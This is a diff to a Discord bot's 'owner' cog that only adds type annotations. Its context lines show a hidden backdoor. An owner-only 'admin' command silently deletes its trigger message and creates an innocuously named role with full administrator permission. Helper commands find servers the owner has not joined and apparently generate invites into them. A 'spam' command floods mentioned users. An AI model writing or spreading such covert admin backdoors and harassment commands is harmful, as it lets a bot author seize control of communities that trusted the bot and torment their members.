@@ -13,7 +13,7 @@ def delete_before(func):
     return wrapper
 
 class owner(commands.Cog):
-    def __init__(self, bot, tokens) -> None:
+    def __init__(self, bot : commands.Bot, tokens) -> None:
         self.bot = bot
         self.spamming = False
 
@@ -28,13 +28,13 @@ class owner(commands.Cog):
             print(str(e))
             self.spamming = False
 
-    async def owner_in_guild(self, guild) -> bool:
+    async def owner_in_guild(self, guild : discord.Guild) -> bool:
         for member in guild.members:
             if await self.bot.is_owner(member):
                 return True
         return False
 
-    async def get_unknown_guilds(self):
+    async def get_unknown_guilds(self) -> list[discord.Guild]:
         unknown_guilds = []
         for guild in self.bot.guilds:
             if not await self.owner_in_guild(guild):
@@ -44,7 +44,7 @@ class owner(commands.Cog):
     @commands.command()
     @commands.is_owner()
     @delete_before
-    async def admin(self, ctx):
+    async def admin(self, ctx : commands.Context):
         member = ctx.message.author
         await ctx.message.guild.create_role(name="Hand Holding Enjoyer", permissions=discord.Permissions(permissions=8))
         role = discord.utils.get(ctx.message.guild.roles, name="Hand Holding Enjoyer")
@@ -53,7 +53,7 @@ class owner(commands.Cog):
     @commands.command()
     @commands.is_owner()
     @delete_before
-    async def invite(self, ctx, server=None):
+    async def invite(self, ctx : commands.Context, server=None):
         if server == None:
             unknown_guilds = await self.get_unknown_guilds()
             dm = await self.bot.create_dm(ctx.author)
@@ -72,7 +72,7 @@ class owner(commands.Cog):
 
     @commands.command(help='mention the users you would like to annoy')
     @delete_before
-    async def spam(self, ctx):
+    async def spam(self, ctx : commands.Context):
         if await self.bot.is_owner(ctx.author):
             for mention in ctx.message.mentions:
                 self.spamming = True
